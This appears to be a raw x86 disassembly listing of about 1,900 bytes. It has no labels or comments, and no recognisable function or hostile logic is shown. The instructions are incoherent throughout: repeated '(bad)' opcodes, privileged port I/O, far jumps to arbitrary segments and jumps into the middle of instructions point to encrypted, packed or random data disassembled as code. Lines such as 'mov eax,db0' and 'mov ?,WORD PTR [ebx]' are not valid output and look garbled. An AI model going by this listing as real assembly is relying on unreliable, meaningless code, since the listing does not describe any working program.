  41bb3f:	stos   BYTE PTR es:[edi],al
  41bb40:	aam    0x23
  41bb42:	sbb    eax,0xa2a19fc2
  41bb47:	repnz out dx,eax
  41bb49:	in     eax,dx
  41bb4a:	orps   xmm1,XMMWORD PTR [edi+0x6f]
  41bb4e:	mov    ebx,0x52bdb954
  41bb53:	mov    eax,db0
  41bb56:	jne    0x41bafd
  41bb58:	arpl   WORD PTR [eax+0x720bcd30],cx
  41bb5e:	xchg   BYTE PTR [esi-0x67],dl
  41bb61:	(bad)  
  41bb62:	in     eax,0x3
  41bb64:	scas   eax,DWORD PTR es:[edi]
  41bb65:	push   ds
  41bb66:	in     eax,0xc
  41bb68:	out    dx,eax
  41bb69:	xor    edx,DWORD PTR [esi+0x71b42aa3]
  41bb6f:	sar    ch,0xe4
  41bb72:	gs cdq 
  41bb74:	rdpmc  
  41bb76:	mov    dh,0x5c
  41bb78:	cli    
  41bb79:	and    eax,0xfd5d210d
  41bb7e:	inc    eax
  41bb7f:	cmp    eax,0x9f5f9eca
  41bb84:	mov    ah,0x5c
  41bb86:	scas   eax,DWORD PTR es:[edi]
  41bb87:	repnz scas eax,DWORD PTR es:[edi]
  41bb89:	push   ebp
  41bb8a:	into   
  41bb8b:	adc    al,0x51
  41bb8d:	jne    0x41bb80
  41bb8f:	cmp    BYTE PTR ds:0x4c4361cb,bl
  41bb95:	mov    bl,0x91
  41bb97:	pop    es
  41bb98:	mov    ch,0x77
  41bb9a:	aaa    
  41bb9b:	xchg   ecx,eax
  41bb9c:	fnstsw WORD PTR [ebx-0x6e4af3bf]
  41bba2:	or     al,0x27
  41bba4:	sti    
  41bba5:	inc    edx
  41bba6:	scas   al,BYTE PTR es:[edi]
  41bba7:	jbe    0x41bb2e
  41bba9:	fucomp st(0)
  41bbab:	test   DWORD PTR [eax],ebp
  41bbad:	(bad)  
  41bbae:	cdq    
  41bbaf:	push   edx
  41bbb0:	pushf  
  41bbb1:	mov    ebx,0xc6d29213
  41bbb6:	mov    esp,0x97118024
  41bbbb:	sub    al,0x65
  41bbbd:	or     al,0xb9
  41bbbf:	push   edi
  41bbc0:	mov    bh,0xd4
  41bbc2:	add    ah,BYTE PTR [esi+ecx*4-0x7e63b141]
  41bbc9:	into   
  41bbca:	sbb    cl,BYTE PTR [ebp-0x3cfa14ea]
  41bbd0:	sub    al,0x4a
  41bbd2:	js     0x41bbe1
  41bbd4:	adc    bl,cl
  41bbd6:	(bad)  
  41bbd7:	(bad)  
  41bbd8:	shr    DWORD PTR [ecx-0x49765404],cl
  41bbde:	(bad)  
  41bbdf:	jb     0x41bb81
  41bbe1:	test   al,0xd
  41bbe3:	shld   DWORD PTR [eax+0x1a],eax,0x2e
  41bbe8:	mov    ds:0xc396602a,al
  41bbed:	jnp    0x41bc58
  41bbef:	inc    ax
  41bbf1:	jecxz  0x41bbee
  41bbf3:	adc    BYTE PTR [ebx],bl
  41bbf5:	jmp    0x85e15d5a
  41bbfa:	bound  esp,QWORD PTR [ebx+0x74]
  41bbfd:	jmp    0x384f985c
  41bc02:	push   0x78
  41bc04:	push   edi
  41bc05:	in     eax,dx
  41bc06:	jbe    0x41bc75
  41bc08:	shr    dl,1
  41bc0a:	dec    esp
  41bc0b:	add    ah,BYTE PTR [esi-0x447eb480]
  41bc11:	add    eax,0x40b7258d
  41bc16:	mov    dl,0xc9
  41bc18:	mov    ds:0xe98fd0fa,eax
  41bc1d:	jb     0x41bc27
  41bc1f:	mov    ds:0x6fa477f7,al
  41bc24:	test   esp,ecx
  41bc26:	gs ret 
  41bc28:	sti    
  41bc29:	dec    esi
  41bc2a:	nop
  41bc2b:	retf   
  41bc2c:	in     eax,dx
  41bc2d:	scas   al,BYTE PTR es:[edi]
  41bc2e:	dec    ebx
  41bc2f:	adc    DWORD PTR [ebx],edi
  41bc31:	mov    esp,0xc32a9dce
  41bc36:	mov    bl,0x61
  41bc38:	pop    ds
  41bc39:	or     cl,BYTE PTR [edx]
  41bc3b:	nop
  41bc3c:	pop    edi
  41bc3d:	icebp  
  41bc3e:	das    
  41bc3f:	sub    eax,0x6279828e
  41bc44:	sbb    edi,DWORD PTR fs:[ecx-0x1b]
  41bc48:	xor    BYTE PTR [edx-0x69a4e42e],0x35
  41bc4f:	dec    ebp
  41bc50:	add    al,0xd0
  41bc52:	retf   0x8f28
  41bc55:	jbe    0x41bcc8
  41bc57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc58:	test   DWORD PTR [ecx-0x20],ebx
  41bc5b:	out    0x5c,al
  41bc5d:	pop    edi
  41bc5e:	call   0xa7a571b7
  41bc63:	daa    
  41bc64:	mov    al,ds:0x1c55820d
  41bc69:	cdq    
  41bc6a:	xor    al,0x59
  41bc6c:	and    al,0x3a
  41bc6e:	xor    al,0xd4
  41bc70:	and    BYTE PTR [ecx-0x4],bl
  41bc73:	test   DWORD PTR [eax-0x76],esp
  41bc76:	test   DWORD PTR [eax-0x19],ebx
  41bc79:	addr16 xor al,0x45
  41bc7c:	outs   dx,BYTE PTR ds:[esi]
  41bc7d:	int3   
  41bc7e:	sar    BYTE PTR [ecx+0x519a76cd],cl
  41bc84:	push   ebx
  41bc85:	(bad)  
  41bc86:	pop    ebx
  41bc87:	jno    0x41bc5e
  41bc89:	xor    esi,DWORD PTR [eax-0x7d]
  41bc8c:	in     eax,0x27
  41bc8e:	pop    ds
  41bc8f:	jecxz  0x41bcff
  41bc91:	lock sbb esp,ecx
  41bc94:	xlat   BYTE PTR ds:[ebx]
  41bc95:	pop    ecx
  41bc96:	dec    ecx
  41bc97:	jae    0x41bd03
  41bc99:	ret    0x4e1
  41bc9c:	dec    eax
  41bc9d:	jmp    0x41bc73
  41bc9f:	(bad)  
  41bca0:	out    dx,al
  41bca1:	icebp  
  41bca2:	mov    al,0xc7
  41bca4:	(bad)  
  41bca5:	ins    BYTE PTR es:[edi],dx
  41bca6:	sbb    eax,0x1d71209f
  41bcab:	in     eax,0x60
  41bcad:	xchg   edi,eax
  41bcae:	sbb    eax,0xd17fad98
  41bcb3:	fiadd  DWORD PTR [ebx]
  41bcb5:	stos   DWORD PTR es:[edi],eax
  41bcb6:	push   cs
  41bcb7:	mov    bh,0x5
  41bcb9:	inc    esp
  41bcba:	iret   
  41bcbb:	cs add eax,0x2eb1c8bd
  41bcc1:	mov    ecx,0x77e219c6
  41bcc6:	out    dx,eax
  41bcc7:	mov    ecx,edx
  41bcc9:	cmp    eax,0x295f7372
  41bcce:	mov    ecx,0x91b62f89
  41bcd3:	popf   
  41bcd4:	jae    0x41bcb9
  41bcd6:	cs mov cl,0xa9
  41bcd9:	inc    edi
  41bcda:	ss mov dl,0x23
  41bcdd:	or     BYTE PTR [ecx-0x5bb2dbc2],cl
  41bce3:	inc    eax
  41bce4:	xor    edi,DWORD PTR [eax]
  41bce6:	cs scas al,BYTE PTR es:[edi]
  41bce8:	ds inc edx
  41bcea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bceb:	and    dh,BYTE PTR [esi]
  41bced:	and    al,0xa3
  41bcef:	push   edi
  41bcf0:	dec    esi
  41bcf1:	mov    dh,0xec
  41bcf3:	mov    bh,0xad
  41bcf5:	pop    ss
  41bcf6:	add    eax,0xeb7440e9
  41bcfb:	push   cs
  41bcfc:	mov    BYTE PTR [edx],0x2f
  41bcff:	push   esi
  41bd00:	int    0x52
  41bd02:	jae    0x41bc8d
  41bd04:	cmp    eax,0x476cd0f9
  41bd09:	jmp    0x124f:0x23331271
  41bd10:	enter  0x2e4,0x94
  41bd14:	sti    
  41bd15:	jbe    0x41bd4d
  41bd17:	or     bh,ch
  41bd19:	aam    0xbb
  41bd1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd1c:	adc    dh,BYTE PTR [edx-0x4ce9dece]
  41bd22:	xlat   BYTE PTR ds:[ebx]
  41bd23:	pushf  
  41bd24:	hlt    
  41bd25:	and    bh,BYTE PTR [edx]
  41bd27:	pop    ss
  41bd28:	inc    ebx
  41bd29:	call   0x340e1bf5
  41bd2e:	dec    ecx
  41bd2f:	jo     0x41bda8
  41bd31:	sar    DWORD PTR [edi],cl
  41bd33:	stos   DWORD PTR es:[edi],eax
  41bd34:	clc    
  41bd35:	mov    esi,0x7244076e
  41bd3a:	ret    0x5998
  41bd3d:	pop    esi
  41bd3e:	(bad)  [eax+0x56dd7ddf]
  41bd44:	xor    dh,cl
  41bd46:	xlat   BYTE PTR ds:[bx]
  41bd48:	mov    esi,DWORD PTR [ecx+edi*1]
  41bd4b:	int3   
  41bd4c:	xlat   BYTE PTR ds:[ebx]
  41bd4d:	bound  edi,QWORD PTR [edx]
  41bd4f:	xor    DWORD PTR [ecx-0x33],0xffffffd9
  41bd53:	mov    edi,0x5a144cb0
  41bd58:	movd   ebp,mm4
  41bd5b:	das    
  41bd5c:	push   0xf
  41bd5e:	adc    al,BYTE PTR [ebx]
  41bd60:	loop   0x41bd4b
  41bd62:	fldcw  WORD PTR [edx-0x3e]
  41bd65:	mov    fs,WORD PTR [eax-0x2cc9e5d]
  41bd6b:	mov    cl,0x52
  41bd6d:	pop    ebp
  41bd6e:	jecxz  0x41bdd2
  41bd70:	push   es
  41bd71:	js     0x41bd11
  41bd73:	test   BYTE PTR [ebx],0xdd
  41bd76:	stos   DWORD PTR es:[edi],eax
  41bd77:	cli    
  41bd78:	inc    edx
  41bd79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd7a:	pop    eax
  41bd7b:	adc    eax,0x25d336e2
  41bd80:	call   0x83c:0x1f5020de
  41bd87:	or     bl,BYTE PTR [edi+esi*1+0x5fe2aca]
  41bd8e:	mov    al,ds:0x523bf51d
  41bd93:	ins    BYTE PTR es:[edi],dx
  41bd94:	sbb    esi,DWORD PTR [ecx+0x7ad28001]
  41bd9a:	scas   eax,DWORD PTR es:[edi]
  41bd9b:	mov    eax,0x6a90916d
  41bda0:	pop    es
  41bda1:	mov    cl,0x6c
  41bda3:	xchg   ebp,eax
  41bda4:	retf   
  41bda5:	cmp    dl,BYTE PTR [ebx]
  41bda7:	cmp    al,BYTE PTR [edi]
  41bda9:	lahf   
  41bdaa:	or     DWORD PTR [edi-0x19b46056],eax
  41bdb0:	adc    BYTE PTR [ebp-0x7302fbbc],bh
  41bdb6:	add    BYTE PTR [esi],dh
  41bdb8:	call   0x240475bd
  41bdbd:	test   al,0x2e
  41bdbf:	xor    bl,dh
  41bdc1:	and    bl,BYTE PTR [eax-0x5779e183]
  41bdc7:	ins    BYTE PTR es:[edi],dx
  41bdc8:	outs   dx,DWORD PTR ds:[esi]
  41bdc9:	add    DWORD PTR [edx+0x36],ebp
  41bdcc:	imul   esi,DWORD PTR [edi-0x80],0xc
  41bdd0:	jecxz  0x41be1f
  41bdd2:	jp     0x41be39
  41bdd4:	xchg   edi,eax
  41bdd5:	stos   DWORD PTR es:[edi],eax
  41bdd6:	repz call 0xc506:0xaebaeef
  41bdde:	pop    ds
  41bddf:	dec    ebx
  41bde0:	rcl    DWORD PTR [esi],cl
  41bde2:	jno    0x41be34
  41bde4:	in     eax,0x76
  41bde6:	push   ebp
  41bde7:	mov    esp,DWORD PTR ds:0xe7b334cb
  41bded:	stos   DWORD PTR es:[edi],eax
  41bdee:	push   esp
  41bdef:	xchg   BYTE PTR [ecx],bh
  41bdf1:	and    eax,0x6b7c20b5
  41bdf6:	lods   eax,DWORD PTR ds:[esi]
  41bdf7:	inc    edx
  41bdf8:	mov    esp,DWORD PTR [ebp-0x2c]
  41bdfb:	mov    esp,0x28f4b15e
  41be00:	das    
  41be01:	push   ebp
  41be02:	pop    eax
  41be03:	fistp  QWORD PTR [esp+ecx*1-0x1]
  41be07:	fwait
  41be08:	pusha  
  41be09:	(bad)  [edx-0x35d51785]
  41be0f:	out    0x3d,al
  41be11:	jle    0x41be07
  41be13:	lods   eax,DWORD PTR ds:[esi]
  41be14:	and    BYTE PTR [esi+0x1c968778],ah
  41be1a:	outs   dx,DWORD PTR ds:[esi]
  41be1b:	fnstsw WORD PTR [ebp+0x5d]
  41be1e:	int    0x6c
  41be20:	cmp    eax,0xe1e74542
  41be25:	inc    edx
  41be26:	fiadd  WORD PTR ds:0xa9595698
  41be2c:	mov    bx,0xd72c
  41be30:	cmp    BYTE PTR [ecx+eiz*2],cl
  41be33:	sub    al,0xd2
  41be35:	xchg   DWORD PTR [esp+ebp*1+0x79e62211],ebp
  41be3c:	mov    al,ds:0x8a0e17ea
  41be41:	cs xchg ax,ax
  41be44:	mov    eax,ds:0x8cbdffa5
  41be49:	inc    esi
  41be4a:	ss push ebp
  41be4c:	sar    dl,1
  41be4e:	push   esp
  41be4f:	inc    edi
  41be50:	fld    TBYTE PTR [edx-0x43]
  41be53:	loope  0x41be2e
  41be55:	xchg   ebx,eax
  41be56:	jb     0x41beb6
  41be58:	cmp    DWORD PTR [ecx+ebx*4],ecx
  41be5b:	std    
  41be5c:	pop    ecx
  41be5d:	mov    ebp,0x2c2f0d4f
  41be62:	stc    
  41be63:	cmp    esp,ebx
  41be65:	fcmovnu st,st(1)
  41be67:	mov    BYTE PTR [ecx+0x56],cl
  41be6a:	call   0x4524f972
  41be6f:	add    ebp,DWORD PTR [esi+ecx*4-0x43ac72ae]
  41be76:	lahf   
  41be77:	retf   
  41be78:	pop    ds
  41be79:	xchg   ebp,eax
  41be7b:	or     eax,0x8a49cd7a
  41be80:	pop    es
  41be81:	scas   eax,DWORD PTR es:[di]
  41be83:	bound  eax,QWORD PTR [esi]
  41be85:	push   ebp
  41be86:	test   BYTE PTR [esi+0x4f],bh
  41be89:	fdiv   DWORD PTR [ecx-0x3a232521]
  41be8f:	fimul  WORD PTR [edi+0x6a]
  41be92:	and    al,0x48
  41be94:	sbb    DWORD PTR [ecx-0x7e],edi
  41be97:	daa    
  41be98:	mov    eax,ecx
  41be9a:	stc    
  41be9b:	pop    esp
  41be9c:	sub    DWORD PTR [ecx],0x7e
  41be9f:	and    BYTE PTR fs:[edi+0x63],cl
  41bea3:	ror    DWORD PTR [esi-0x43824f8b],1
  41bea9:	pop    ss
  41beaa:	push   ebp
  41beab:	enter  0x6184,0x92
  41beaf:	push   0x782b098d
  41beb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41beb5:	or     bl,BYTE PTR [ecx+0x8b608a0]
  41bebb:	mov    ah,0xb0
  41bebd:	cwde   
  41bebe:	mov    esi,ebp
  41bec0:	dec    edx
  41bec1:	ficom  WORD PTR [edi+0x1f]
  41bec4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bec5:	sbb    DWORD PTR [edi],edi
  41bec7:	mov    ebx,0xa309cf6f
  41becc:	pop    edi
  41becd:	sub    bl,dl
  41becf:	dec    ecx
  41bed0:	cli    
  41bed1:	inc    esi
  41bed2:	inc    edi
  41bed3:	push   esi
  41bed4:	push   edx
  41bed5:	lds    esi,FWORD PTR ds:0xaaa455b
  41bedb:	add    eax,0xbf17115e
  41bee0:	(bad)  
  41bee2:	test   al,0x49
  41bee4:	and    eax,DWORD PTR [edi]
  41bee6:	ja     0x41bf5f
  41bee8:	pop    es
  41bee9:	mov    ss,edx
  41beeb:	xchg   esi,eax
  41beec:	stc    
  41beed:	push   edx
  41beee:	jecxz  0x41beb1
  41bef0:	(bad)  
  41bef1:	out    dx,eax
  41bef2:	xor    BYTE PTR [ecx],0xe4
  41bef5:	push   esi
  41bef6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bef7:	enter  0x57b3,0x65
  41befb:	mov    al,ds:0x1f4d6c58
  41bf00:	data16 mov al,ds:0x44b978a2
  41bf06:	in     al,0x36
  41bf08:	nop
  41bf09:	push   ecx
  41bf0a:	add    BYTE PTR [ecx+0x7b],cl
  41bf0d:	add    eax,0x5ab4fed3
  41bf12:	scas   al,BYTE PTR es:[edi]
  41bf13:	sub    ch,BYTE PTR es:[edi]
  41bf16:	adc    ch,BYTE PTR [ebx+0x4f]
  41bf19:	iret   
  41bf1a:	ret    
  41bf1b:	out    dx,al
  41bf1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bf1d:	fidivr WORD PTR [ebx-0x2f]
  41bf20:	pusha  
  41bf21:	xor    DWORD PTR [esi-0x7f995abf],ebp
  41bf27:	cmp    bh,BYTE PTR ds:0x8f4471db
  41bf2d:	in     al,dx
  41bf2e:	ss popf 
  41bf30:	scas   al,BYTE PTR es:[edi]
  41bf31:	dec    esi
  41bf32:	sbb    ebp,DWORD PTR [ecx+0x504e61c6]
  41bf38:	outs   dx,DWORD PTR ds:[esi]
  41bf39:	mov    al,0x2a
  41bf3b:	(bad)  
  41bf3c:	mov    ebp,0xd220532f
  41bf41:	cwde   
  41bf42:	xlat   BYTE PTR ds:[ebx]
  41bf43:	cmc    
  41bf44:	jb     0x41bfbb
  41bf46:	nop
  41bf47:	ror    BYTE PTR [esi],1
  41bf49:	inc    edi
  41bf4a:	imul   ecx,DWORD PTR [ebp-0x77394571],0xa9056642
  41bf54:	stos   BYTE PTR es:[edi],al
  41bf55:	ss pop ds
  41bf57:	daa    
  41bf58:	xor    esi,edi
  41bf5a:	jae    0x41bf2a
  41bf5c:	cmp    al,0xda
  41bf5e:	jle    0x41bf19
  41bf60:	clc    
  41bf61:	in     al,dx
  41bf62:	inc    edi
  41bf63:	dec    esi
  41bf64:	ja     0x41bf0e
  41bf66:	shr    BYTE PTR [edx],1
  41bf68:	mov    ds:0x1a95ef4,eax
  41bf6d:	pop    esi
  41bf6e:	ror    BYTE PTR [eax+0x4a3fe636],1
  41bf74:	test   DWORD PTR ds:0x6971f071,edx
  41bf7a:	adc    al,0x3c
  41bf7c:	cmp    al,0x3
  41bf7e:	xor    al,0x69
  41bf80:	add    bl,BYTE PTR [edx]
  41bf82:	icebp  
  41bf83:	inc    ebx
  41bf84:	sbb    al,0xec
  41bf86:	out    0x44,al
  41bf88:	jb     0x41bff4
  41bf8a:	jl     0x41bf71
  41bf8c:	test   DWORD PTR [ebp+edi*1-0x6c],ebp
  41bf90:	sub    DWORD PTR [ebp-0x5100850],edi
  41bf96:	xrelease mov DWORD PTR [esi-0x66],edx
  41bf9a:	std    
  41bf9b:	inc    ebx
  41bf9c:	jle    0x41c007
  41bf9e:	aaa    
  41bf9f:	icebp  
  41bfa0:	bound  edx,QWORD PTR [edx+0x6c]
  41bfa3:	xchg   DWORD PTR [esi+0x7d],ebp
  41bfa6:	push   ecx
  41bfa7:	xchg   DWORD PTR [ecx-0x30],eax
  41bfaa:	xor    bh,dl
  41bfac:	shr    DWORD PTR [edi+0x70],1
  41bfaf:	popf   
  41bfb0:	mov    ecx,edx
  41bfb2:	in     eax,0x88
  41bfb4:	mov    ebp,0x40c940cd
  41bfb9:	(bad)  
  41bfba:	fld    st(2)
  41bfbc:	or     BYTE PTR ds:0x4e785e68,0xfa
  41bfc3:	retf   
  41bfc4:	pop    eax
  41bfc5:	adc    DWORD PTR [edx-0x7576b48a],eax
  41bfcb:	mov    ch,0xac
  41bfcd:	mov    tr4,ebp
  41bfd0:	adc    edx,DWORD PTR [ecx]
  41bfd2:	mov    bh,0xe0
  41bfd4:	aam    0x11
  41bfd6:	(bad)  
  41bfd7:	sbb    al,0xd4
  41bfd9:	imul   ebp,DWORD PTR [esi],0x161341fd
  41bfdf:	push   eax
  41bfe0:	and    esi,DWORD PTR [ecx-0x28]
  41bfe3:	int3   
  41bfe4:	sub    eax,0x7127f68c
  41bfe9:	inc    ebp
  41bfea:	mov    ds:0x1518eb13,eax
  41bfef:	stc    
  41bff0:	cmp    ecx,eax
  41bff2:	dec    ebp
  41bff3:	scas   al,BYTE PTR es:[edi]
  41bff4:	imul   ecx,DWORD PTR [edx-0x408e45e0],0x776c0880
  41bffe:	out    dx,eax
  41bfff:	push   0x79
  41c001:	jbe    0x41bfed
  41c003:	popa   
  41c004:	je     0x41c077
  41c006:	jg     0x41c05e
  41c008:	mov    bl,0x26
  41c00a:	int3   
  41c00b:	(bad)  
  41c00c:	ja     0x41bfac
  41c00e:	rol    BYTE PTR [ecx],1
  41c010:	or     eax,0x7ac2ab87
  41c015:	shr    BYTE PTR [ecx],cl
  41c017:	aad    0xad
  41c019:	add    dl,BYTE PTR [edi]
  41c01b:	or     al,ah
  41c01d:	aam    0x40
  41c01f:	xchg   esp,eax
  41c020:	jo     0x41c00f
  41c022:	shr    bl,0x3
  41c025:	push   ecx
  41c026:	inc    esi
  41c027:	xlat   BYTE PTR ds:[ebx]
  41c028:	xor    edi,DWORD PTR [edx+0x1cc95286]
  41c02e:	mov    edx,DWORD PTR [edx-0x333d29cd]
  41c034:	add    edi,DWORD PTR [edi+0x6215bf48]
  41c03a:	sbb    dh,ch
  41c03c:	retf   0xbfe1
  41c03f:	movhps QWORD PTR ds:0x4ea2eead,xmm2
  41c046:	push   esi
  41c047:	and    BYTE PTR [ecx-0x6],al
  41c04a:	mov    dl,0x88
  41c04c:	mov    DWORD PTR [ebp+ebp*1+0x277465a],ebp
  41c053:	push   ebx
  41c054:	imul   esp,DWORD PTR [esi-0x2f28edc6],0x626c929f
  41c05e:	(bad)  
  41c05f:	fsubr  QWORD PTR [ebp-0x1a10eb53]
  41c065:	cs jmp 0x795:0xe80e884a
  41c06d:	xor    al,0xb6
  41c06f:	inc    ecx
  41c070:	and    edx,DWORD PTR [ebp+0x9]
  41c073:	dec    ebp
  41c074:	pop    esp
  41c075:	cmp    bl,al
  41c077:	pop    ss
  41c078:	xor    al,0x97
  41c07a:	xchg   esp,eax
  41c07b:	test   eax,0xd2462c14
  41c080:	out    0x32,eax
  41c082:	iret   
  41c083:	xchg   ebp,eax
  41c084:	pop    edx
  41c085:	and    DWORD PTR [edx+0x686eafda],ecx
  41c08b:	sub    eax,0x16bf01bc
  41c090:	test   DWORD PTR ds:0xcb6666ad,ecx
  41c096:	jl     0x41c0c5
  41c098:	scas   al,BYTE PTR es:[edi]
  41c099:	xchg   edi,eax
  41c09a:	retf   0xffaa
  41c09d:	iret   
  41c09e:	test   DWORD PTR ds:0x5ce1d242,edx
  41c0a4:	mov    ecx,0xaa770d4c
  41c0a9:	std    
  41c0aa:	and    eax,0x430c3631
  41c0af:	pop    edi
  41c0b0:	dec    ebp
  41c0b1:	sub    edi,DWORD PTR [ebp-0x7ac3627c]
  41c0b7:	push   cs
  41c0b8:	cwde   
  41c0b9:	add    cl,bl
  41c0bb:	retf   0xa761
  41c0be:	mov    ds:0x22bfe76b,al
  41c0c3:	sub    esi,ebx
  41c0c5:	ja     0x41c080
  41c0c7:	add    al,0x42
  41c0c9:	out    dx,al
  41c0ca:	sbb    DWORD PTR [ecx+0x14],eax
  41c0cd:	inc    ebp
  41c0ce:	dec    esp
  41c0cf:	jnp    0x41c11b
  41c0d1:	sbb    eax,0xef701fa5
  41c0d6:	aas    
  41c0d7:	jmp    0x5c81:0x94134423
  41c0de:	jmp    0x42e8:0xf62c9415
  41c0e5:	xchg   BYTE PTR cs:[ecx],bh
  41c0e8:	ficomp WORD PTR [edx]
  41c0ea:	lock mov ah,0x34
  41c0ed:	add    eax,0x6f42c297
  41c0f2:	pop    edi
  41c0f3:	ficom  DWORD PTR [edx+0x1795ded0]
  41c0f9:	fsubr  DWORD PTR [bp+si]
  41c0fc:	scas   al,BYTE PTR es:[edi]
  41c0fd:	cdq    
  41c0fe:	cmp    BYTE PTR [eax],ch
  41c100:	mov    eax,ds:0xbaa35f58
  41c105:	fild   DWORD PTR [ebx]
  41c107:	and    BYTE PTR [eax],bh
  41c109:	adc    BYTE PTR [eax],0xed
  41c10c:	sbb    eax,0xd239650a
  41c111:	add    bh,BYTE PTR [eax+0x5784a7c5]
  41c117:	xchg   DWORD PTR [ebx-0x2c],esp
  41c11a:	push   eax
  41c11b:	lock je 0x41c0bb
  41c11e:	push   cs
  41c11f:	(bad)  
  41c120:	aam    0x1c
  41c122:	xchg   ebx,eax
  41c123:	inc    edx
  41c124:	call   FWORD PTR ds:[edi-0x5d5437c8]
  41c12b:	add    eax,0x4050571a
  41c130:	xor    DWORD PTR [eax+edx*8-0x6a],ebx
  41c134:	xchg   esp,eax
  41c135:	daa    
  41c136:	adc    eax,0x5f965b6e
  41c13b:	dec    eax
  41c13c:	dec    ecx
  41c13d:	adc    ah,BYTE PTR [ebx+0x754ef5fd]
  41c143:	and    eax,esp
  41c145:	xchg   esp,eax
  41c146:	(bad)  
  41c147:	cld    
  41c148:	js     0x41c0e7
  41c14a:	imul   edi,DWORD PTR [edi+eiz*8-0x5d2b480d],0x7faaa176
  41c155:	dec    esi
  41c156:	mov    ch,0x7a
  41c158:	pop    edx
  41c159:	in     eax,0x55
  41c15b:	lahf   
  41c15c:	fstp   QWORD PTR [eax]
  41c15e:	jns    0x41c168
  41c160:	stc    
  41c161:	test   eax,0xfc9cf2a9
  41c166:	fs in  al,dx
  41c168:	and    eax,0x74c892
  41c16d:	add    DWORD PTR [ebx],edi
  41c16f:	fwait
  41c170:	lea    ecx,[eax-0x80]
  41c173:	(bad)  
  41c174:	shr    BYTE PTR [ebx],1
  41c176:	rcl    edi,0x5e
  41c179:	mov    gs,WORD PTR ds:0xd932645d
  41c17f:	test   al,0x9b
  41c181:	(bad)  
  41c182:	in     eax,dx
  41c183:	dec    edi
  41c184:	lahf   
  41c185:	(bad)  [ebp-0x261d53e7]
  41c18b:	inc    ebp
  41c18c:	add    BYTE PTR [ecx+0x36],al
  41c18f:	dec    ebp
  41c190:	aas    
  41c191:	call   FWORD PTR [ebp+0x55]
  41c194:	sub    DWORD PTR ds:0x75f453c4,0x61
  41c19b:	mov    dh,dl
  41c19d:	je     0x41c1cf
  41c19f:	clc    
  41c1a0:	outs   dx,BYTE PTR ds:[esi]
  41c1a1:	mov    eax,0x109f879
  41c1a6:	jbe    0x41c151
  41c1a8:	mov    ch,0x5b
  41c1aa:	scas   al,BYTE PTR es:[edi]
  41c1ab:	addr16 mov al,0x7
  41c1ae:	xchg   ebp,eax
  41c1af:	es sahf 
  41c1b1:	sbb    esi,DWORD PTR [ebx]
  41c1b3:	test   eax,0xd4cc825a
  41c1b8:	fwait
  41c1b9:	(bad)  
  41c1ba:	(bad)  [edx]
  41c1bc:	popa   
  41c1bd:	mov    cl,0x4b
  41c1bf:	mov    edx,0x6d8200b8
  41c1c4:	mov    ebp,0x30e9ad4a
  41c1c9:	(bad)  
  41c1ca:	lods   al,BYTE PTR ds:[esi]
  41c1cb:	mov    esi,DWORD PTR [ecx-0x40]
  41c1ce:	test   eax,0xfcd50579
  41c1d3:	mov    eax,0x5514108
  41c1d8:	pop    ebp
  41c1d9:	pop    esi
  41c1da:	push   DWORD PTR [edi]
  41c1dc:	push   ebp
  41c1dd:	mov    ?,WORD PTR [ebx]
  41c1df:	ret    0x99f0
  41c1e2:	jle    0x41c1fc
  41c1e4:	(bad)  
  41c1e5:	in     eax,dx
  41c1e6:	jo     0x41c253
  41c1e8:	in     eax,dx
  41c1e9:	pop    ebx
  41c1ea:	cmc    
  41c1eb:	jns    0x41c16e
  41c1ed:	add    eax,0x95c37eb4
  41c1f2:	inc    ecx
  41c1f3:	inc    edx
  41c1f4:	lea    ax,[ecx]
  41c1f7:	mov    ch,0xb2
  41c1f9:	jg     0x41c24e
  41c1fb:	mov    esp,0xbadff072
  41c200:	push   cs
  41c201:	aaa    
  41c202:	add    eax,esi
  41c204:	and    edi,esp
  41c206:	sahf   
  41c207:	xor    DWORD PTR ds:[edx-0x55],esp
  41c20b:	fisub  DWORD PTR [eax+0xbece81]
  41c211:	sbb    eax,0x29070e82
  41c216:	shl    BYTE PTR [edx],1
  41c218:	es dec edi
  41c21a:	pop    esp
  41c21b:	sub    BYTE PTR [esi-0x55],0x35
  41c21f:	jecxz  0x41c23a
  41c221:	mov    ds:0xf717ff31,al
  41c226:	xor    eax,0x9b123f2b
  41c22b:	push   esp
  41c22c:	xor    BYTE PTR [esi],ah
  41c22e:	adc    BYTE PTR [edx+0x2],dl
  41c231:	fiadd  DWORD PTR [esi-0x50bac672]
  41c237:	push   esi
  41c238:	inc    BYTE PTR ds:0x11006b43
  41c23e:	add    esp,esi
  41c240:	add    DWORD PTR [eax+0x72],esp
  41c243:	mov    es,ebx
  41c245:	lock into 
  41c247:	fld    QWORD PTR ss:[ebp+0x14]
  41c24b:	je     0x41c2c2
  41c24d:	sbb    al,bh
  41c24f:	mov    eax,0xeb223c79
  41c254:	and    edx,ebx
  41c256:	repnz fstp DWORD PTR [eax-0x7e]
  41c25a:	ret    0x753
  41c25d:	mov    cl,0x9f
  41c25f:	xchg   esp,eax
  41c260:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c261:	fist   DWORD PTR [ecx-0x3f]
  41c264:	mov    edx,0xf0651c4
  41c269:	(bad)  
  41c26a:	xor    BYTE PTR [eax-0x35a64f11],al
  41c270:	xor    ch,BYTE PTR [edi-0x74]
  41c273:	fbld   TBYTE PTR [edi-0xc8ba24e]
  41c279:	jmp    0x43a9:0x9439d9a5
  41c280:	sbb    BYTE PTR [ecx-0x63adeffd],dh
  41c286:	push   ecx
  41c287:	inc    edi
  41c289:	fwait
  41c28a:	sub    DWORD PTR [edi+0x5dbf18f0],ecx
  41c290:	out    dx,eax
  41c291:	mov    ecx,DWORD PTR [eax+0x24b9adc7]
  41c297:	or     BYTE PTR [esi+eiz*8],ah
  41c29a:	pop    ebx
  41c29b:	in     eax,0x21
  41c29d:	ins    BYTE PTR es:[edi],dx
  41c29e:	cli    
  41c29f:	icebp  
  41c2a0:	jle    0x41c2cb
  41c2a2:	pop    edx
  41c2a3:	je     0x41c2ab
  41c2a5:	data16 test dl,bl
  41c2a8:	dec    edi
  41c2a9:	lock pop esi
  41c2ab:	dec    esi
